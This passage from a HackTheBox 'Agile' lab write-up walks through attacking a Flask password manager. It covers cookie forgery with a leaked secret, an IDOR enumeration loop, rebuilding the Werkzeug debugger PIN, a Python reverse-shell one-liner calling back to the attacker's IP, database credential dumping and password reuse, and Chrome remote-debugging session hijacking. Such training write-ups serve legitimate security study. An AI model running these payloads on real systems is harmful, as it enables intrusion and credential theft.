+</div><p>It includes a time variable which we have no way of knowing. Essentially, it is technically possible to try to brute force potential exports by guessing every possible combination of 10 characters. But this can be considered a last resort, as it is not guaranteed that machine usernames will match the service&rsquo;s account names, nor guarantee that the user had generated a csv file at all.</p>
+<h4 id="forging-a-flask-cookie">Forging a flask cookie
+</h4><p>My next thought is with the source code available and the flask secret (given through the error), we might try to forge a cookie for a different user.</p>
+<p>Starting with our cookie, we can grab it from Burpsuite&rsquo;s request after session=</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting a <a class="link" href="https://www.kirsle.net/wizards/flask-session.cgi"  target="_blank" rel="noopener"
+    >Flask cookie decoder online tool</a>, we can decode without issue into something more readable:</p>
+<p><img src="/p/hackthebox-agile/Images/DecodeCookie.png"
+	width="1389"
+	height="540"
+	srcset="/p/hackthebox-agile/Images/DecodeCookie_hu15462977600570445788.png 480w, /p/hackthebox-agile/Images/DecodeCookie_hu2555032998909592745.png 1024w"
+	loading="lazy"
+	
+		alt="Flask Decoded"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="617px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;_fresh&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;_id&#34;</span><span class="p">:</span> <span class="s2">&#34;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;_user_id&#34;</span><span class="p">:</span> <span class="s2">&#34;9&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>While the <code>_id</code> appears to be a unique string likely tied to our current login session, we can see that we are user_id 9. Assuming the count starts at 0 and the admin has the first account, I edit this segment of the cookie and then I must re-sign using Flask&rsquo;s secret key. To do so, I utilize the popular tool <a class="link" href="https://github.com/Paradoxis/Flask-Unsign"  target="_blank" rel="noopener"
+    >Flask-Unsign</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Agile]
+</span></span><span class="line"><span class="cl">└─$ cat tosign.txt                                      
+</span></span><span class="line"><span class="cl">{&#39;_fresh&#39;: True, &#39;_id&#39;: &#39;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96&#39;, &#39;_user_id&#39;: &#39;0&#39;}
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                            
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Agile]
+</span></span><span class="line"><span class="cl">└─$ flask-unsign -s -S &#39;tDxE1kBphctDjlZ1DvYf&#39; --cookie tosign.txt
+</span></span><span class="line"><span class="cl">InRvc2lnbi50eHQi.ZMqw8Q.zmr3nM3FEIqwYykzEMSZnSCCPsk
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unfortunately, trying to use this cookie resulted in a failure. Presumably, the <code>_id</code> hash no longer correlates to <code>_user_id</code> value and the cookie session becomes invalid.</p>
+<h4 id="idor-access-on-other-users-passwords">IDOR access on other user&rsquo;s passwords
+</h4><p>When following the request trail involved in editing a password or leaving editor mode, we can see the url activities visiting <code>/vault/row/&lt;id&gt;</code> or <code>/vault/edit_row/&lt;id&gt;</code>. Additionally, when reviewing the source code, we see a similar check being performed, with seemingly no verification on the user. We can write a quick script to check a number range, or do the same in Burpsuite Intruder option:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">for</span> i in <span class="o">{</span>0..15<span class="o">}</span>  
+</span></span><span class="line"><span class="cl"><span class="k">do</span>  
+</span></span><span class="line"><span class="cl"> curl http://superpass.htb/vault/get/<span class="nv">$i</span> --cookie <span class="s2">&#34;session=.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmY  
+</span></span></span><span class="line"><span class="cl"><span class="s2">x6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This approach was successful on box release, but has since been patched. Apparently it was never an intended approach.</p>
+<h2 id="foothold">Foothold
+</h2><h3 id="recreating-werkzeugs-debugger-pin">Recreating Werkzeug&rsquo;s Debugger PIN
+</h3><p>Eventually I turn myself to the system&rsquo;s active <code>debugger</code> mode. We noticed that this is turned on, since when we requested to download a file that didn&rsquo;t exist, we saw detailed traceback. From these error pages, we can open an interactive terminal by clicking on the console icon available when hovering over one of the code lines:</p>
+<p><img src="/p/hackthebox-agile/Images/ConsoleOption.png"
+	width="981"
+	height="557"
+	srcset="/p/hackthebox-agile/Images/ConsoleOption_hu4404216611697951013.png 480w, /p/hackthebox-agile/Images/ConsoleOption_hu12286550215720389279.png 1024w"
+	loading="lazy"
+	
+		alt="Console Option Available"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="176"
+		data-flex-basis="422px"
+	
+></p>
+<p>However, in order to prevent any random user from executing shell commands, a customized PIN is generated when the web server is launched. This is PIN is intended to be accessible only to the operators on the machine. The PIN is provided to console output, not saved in any guessable location.</p>
+<p><img src="/p/hackthebox-agile/Images/PIN_Ask.png"
+	width="453"
+	height="243"
+	srcset="/p/hackthebox-agile/Images/PIN_Ask_hu14137086698026707427.png 480w, /p/hackthebox-agile/Images/PIN_Ask_hu6976597806398669121.png 1024w"
+	loading="lazy"
+	
+		alt="PIN requirement"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<p>There is a <a class="link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug"  target="_blank" rel="noopener"
+    >hacktricks article</a> covering how we generate a matching PIN number based on some of the system&rsquo;s information.</p>
+<p>We must gather system information utilized to generate the PIN, then we can recreate it locally using the script presented in the article. Each component was a small adventure to get. The final script contained the following information:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+</span></span><span class="line"><span class="cl"><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;www-data&#39;</span><span class="p">,</span><span class="c1"># username</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;wsgi_app&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;/app/venv/lib/python3.10/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;345052401235&#39;</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ed5b159560f54721827644bc9b220d00superpass.service&#39;</span><span class="c1"># get_machine_id(), /etc/machine-id</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Username as <code>www-data</code> is common for linux web services, although python can also be run by users as well. I had been trying combinations with both <code>www-data</code> as well as <code>runner</code>, as this account seemed like it might have been generated for the sole purpose of running a web server.</li>
+<li>Modname as <code>flask.app</code> is the default option provided by Hacktricks, but also we can see this in <code>app.py</code>, where it simply states <code>import flask</code>.</li>
+<li><code>wsgi_app</code> was the hardest to find, as this variable is not well defined in the article, simply presented as Flask. Under <code>def enable_debug():</code> from app.py, we see the debug application referred to as <code>app.wsgi_app = DebuggedApplication(app.wsgi_app, True)</code>.</li>
+<li><code>/app/venv/lib/python3.10/site-packages/flask/app.py</code> is given on the error page.
+Private Bits:</li>
+<li>When accessing <code>/sys/class/net/eth0/address</code>, we get id 00:50:56:b9:ce:53:</li>
+</ul>
+<p><img src="/p/hackthebox-agile/Images/Address.png"
+	width="1008"
+	height="407"
+	srcset="/p/hackthebox-agile/Images/Address_hu10965654866176807733.png 480w, /p/hackthebox-agile/Images/Address_hu11409967741569135173.png 1024w"
+	loading="lazy"
+	
+		alt="eth0 address"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="594px"
+	
+></p>
+<p>To convert into the private bit variable, we utilize python to print:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="mh">0x005056b9ce53</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">345052401235</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Machine ID is a combination of <code>/etc/machine-id</code> and the last section of <code>/proc/self/cgroup</code>. Visiting <code>/etc/machine-id</code>:</li>
+</ul>
+<p><img src="/p/hackthebox-agile/Images/Machine.png"
+	width="1025"
+	height="401"
+	srcset="/p/hackthebox-agile/Images/Machine_hu308876979202478925.png 480w, /p/hackthebox-agile/Images/Machine_hu6753679812062399560.png 1024w"
+	loading="lazy"
+	
+		alt="Machine ID"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
+></p>
+<p>Visiting <code>/proc/self/cgroup</code>:</p>
+<p><img src="/p/hackthebox-agile/Images/cgroup.png"
+	width="1033"
+	height="404"
+	srcset="/p/hackthebox-agile/Images/cgroup_hu17195763092321997776.png 480w, /p/hackthebox-agile/Images/cgroup_hu4243673824352638754.png 1024w"
+	loading="lazy"
+	
+		alt="cgroup"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
+></p>
+<p>The combined bit is <code>ed5b159560f54721827644bc9b220d00superpass.service</code></p>
+<h3 id="remote-code-execution-as-www-data">Remote Code Execution as <code>www-data</code>
+</h3><p>Now with a debug PIN correctly generated, we can finally access the debugging console by clicking the interactive icon on any code in the error:</p>
+<p><img src="/p/hackthebox-agile/Images/consoleready.png"
+	width="497"
+	height="123"
+	srcset="/p/hackthebox-agile/Images/consoleready_hu4168205613216228337.png 480w, /p/hackthebox-agile/Images/consoleready_hu17854623775851212215.png 1024w"
+	loading="lazy"
+	
+		alt="debug active"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="969px"
+	
+></p>
+<p><code>import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.133&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)</code></p>
+<p>On our listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nvlp <span class="m">8888</span>        
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">8888</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.133<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.203<span class="o">]</span> <span class="m">55440</span>
+</span></span><span class="line"><span class="cl">$ whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have a shell, but it is still a &ldquo;dumb&rdquo; shell. Features such as autocomplete or interactive binaries such as vim will not work well, so we need to stabilize the shell. There are many ways to do this, my favorite being the use of <code>script</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl"><span class="o">(</span>venv<span class="o">)</span> www-data@agile:/app/app$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From here we background the session with ctrl+Z, and type <code>stty raw -echo; fg</code>. The fg will put us back into the rev shell session, where we press enter a 2nd time and our shell has been stabilized.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>venv<span class="o">)</span> www-data@agile:/app/app$ ^Z
+</span></span><span class="line"><span class="cl">zsh: suspended  nc -nvlp <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">                                                                                                                                                         
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Agile<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + continued  nc -nvlp <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>venv<span class="o">)</span> www-data@agile:/app/app$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="lateral-movement">Lateral Movement
+</h2><h3 id="accessing-the-sql-database">Accessing the SQL database
+</h3><p>After brief enumeration, I find an interesting json file in the base /app folder containing the SQL credentials:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(venv) www-data@agile:/app$ cat config_prod.json 
+</span></span><span class="line"><span class="cl">{&#34;SQL_URI&#34;: &#34;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see credentials as <code>superpassuser:dSA6l7q*yIVs$39Ml6ywvgK</code>. Since our shell has been stabilized, we can call an interactive mysql session. This would have failed if we had tried earlier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(venv) www-data@agile:/app$ mysql -u superpassuser -p                    
+</span></span><span class="line"><span class="cl">Enter password: 
+</span></span><span class="line"><span class="cl">Welcome to the MySQL monitor.  Commands end with ; or \g.
+</span></span><span class="line"><span class="cl">Your MySQL connection id is 392
+</span></span><span class="line"><span class="cl">Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Oracle is a registered trademark of Oracle Corporation and/or its
+</span></span><span class="line"><span class="cl">affiliates. Other names may be trademarks of their respective
+</span></span><span class="line"><span class="cl">owners.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mysql&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Navigating the SQL is rather easy since there isn&rsquo;t much information. The only unique database is <code>superpass</code>, and only 2 tables exist:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; show tables;
+</span></span><span class="line"><span class="cl">+---------------------+
+</span></span><span class="line"><span class="cl">| Tables_in_superpass |
+</span></span><span class="line"><span class="cl">+---------------------+
+</span></span><span class="line"><span class="cl">| passwords           |
+</span></span><span class="line"><span class="cl">| users               |
+</span></span><span class="line"><span class="cl">+---------------------+
+</span></span><span class="line"><span class="cl">2 rows in set (0.00 sec)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mysql&gt; select * from passwords;
+</span></span><span class="line"><span class="cl">+----+---------------------+---------------------+----------------+----------+----------------------+---------+
+</span></span><span class="line"><span class="cl">| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+</span></span><span class="line"><span class="cl">+----+---------------------+---------------------+----------------+----------+----------------------+---------+
+</span></span><span class="line"><span class="cl">|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
+</span></span><span class="line"><span class="cl">|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
+</span></span><span class="line"><span class="cl">|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
+</span></span><span class="line"><span class="cl">|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
+</span></span><span class="line"><span class="cl">|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+</span></span><span class="line"><span class="cl">| 10 | 2023-08-03 15:36:53 | 2023-08-03 15:36:53 |                |          | 7bbe46f078cc431df0c8 |      11 |
+</span></span><span class="line"><span class="cl">+----+---------------------+---------------------+----------------+----------+----------------------+---------+
+</span></span><span class="line"><span class="cl">6 rows in set (0.00 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Recall that on this machine, we saw a user named <code>corum</code>? Perhaps the &lsquo;agile&rsquo; url password is referring to this machine. When checking with <code>su</code>, we see a success.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(venv) www-data@agile:/app$ su corum
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">corum@agile:/app$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As great as the stabilized reverse shell is, I happily move to an ssh connection from this point, as port 22 was confirmed open.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh corum@superpass.htb
+</span></span><span class="line"><span class="cl">corum@superpass.htb<span class="s1">&#39;s password: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1"> * Documentation:  https://help.ubuntu.com
+</span></span></span><span class="line"><span class="cl"><span class="s1"> * Management:     https://landscape.canonical.com
+</span></span></span><span class="line"><span class="cl"><span class="s1"> * Support:        https://ubuntu.com/advantage
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">This system has been minimized by removing packages and content that are
+</span></span></span><span class="line"><span class="cl"><span class="s1">not required on a system that users do not log into.
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Thu Aug  <span class="m">3</span> 15:45:18 <span class="m">2023</span> from 10.10.14.133
+</span></span><span class="line"><span class="cl">corum@agile:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have finally reached the <code>user.txt</code>.</p>
+<h3 id="hijacking-a-google-chrome-session-through-remote-debugging-port">Hijacking a google chrome session through remote-debugging port
+</h3><p>Manual enumeration did not yield anything interesting to me. However, executing <code>linpeas</code> showed me a potential route to privilege escalation i was unaware of.</p>
+<p><img src="/p/hackthebox-agile/Images/RunnerDebugPort.png"
+	width="1312"
+	height="153"
+	srcset="/p/hackthebox-agile/Images/RunnerDebugPort_hu8124791435145240112.png 480w, /p/hackthebox-agile/Images/RunnerDebugPort_hu15995928169581925601.png 1024w"
+	loading="lazy"
+	
+		alt="Chrome session with remote debugging port"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="857"
+		data-flex-basis="2058px"
+	
+></p>
+<p>There is a process of google chrome running, and special attention is drawn to the fact that the <code>--remote-debugging-port</code> flag is set. It appears that we might be able to hijack this web session, and explore the capabilities of what <code>runner</code> can access in this webpage. First, we need a way for our local browser to reach the box&rsquo;s port 41829. This is not directly accessible from our machine, so we must apply port forwarding. Chisel is a popular option, but since ssh exists I just utilize this approach</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh -L 1080:localhost:41829 corum@superpass.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To enter the port forwarding page in Google Chrome, in the url segment we type <code>chrome://inspect/#devices</code>. Next, we must configure our ports to the right of &ldquo;Discover network targets&rdquo;</p>
+<p><img src="/p/hackthebox-agile/Images/ChromeConfig1.png"
+	width="935"
+	height="375"
+	srcset="/p/hackthebox-agile/Images/ChromeConfig1_hu9802934573219149599.png 480w, /p/hackthebox-agile/Images/ChromeConfig1_hu4978080630267507083.png 1024w"
+	loading="lazy"
+	
+		alt="Port Forwarding Page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="598px"
+	
+></p>
+<p>Set the address as localhost:1080, matching the listening port listed in our ssh command. This traffic will be forwarded to Agile box&rsquo;s port 41829.</p>
+<p><img src="/p/hackthebox-agile/Images/ChromeConfig2.png"
+	width="301"
+	height="338"
+	srcset="/p/hackthebox-agile/Images/ChromeConfig2_hu5374653952007228421.png 480w, /p/hackthebox-agile/Images/ChromeConfig2_hu12515421942221366568.png 1024w"
+	loading="lazy"
+	
+		alt="Setting the address"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="89"
+		data-flex-basis="213px"
+	
+></p>
+<p>Now we can see a remote target. Notice the address is at <code>http://test.superpass.htb</code>. This seems to be a local-only version of the service, potentially with different password information than the live version we interacted with previously.</p>
+<p><img src="/p/hackthebox-agile/Images/RemoteTarget.png"
+	width="716"
+	height="339"
+	srcset="/p/hackthebox-agile/Images/RemoteTarget_hu4071108062810845731.png 480w, /p/hackthebox-agile/Images/RemoteTarget_hu9419491262988778563.png 1024w"
+	loading="lazy"
+	
+		alt="Target is now visible and accessible"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="506px"
+	
+></p>
+<p>Selecting <code>inspect</code> will open a new DevTools tab, where we can interact with the chrome session.</p>
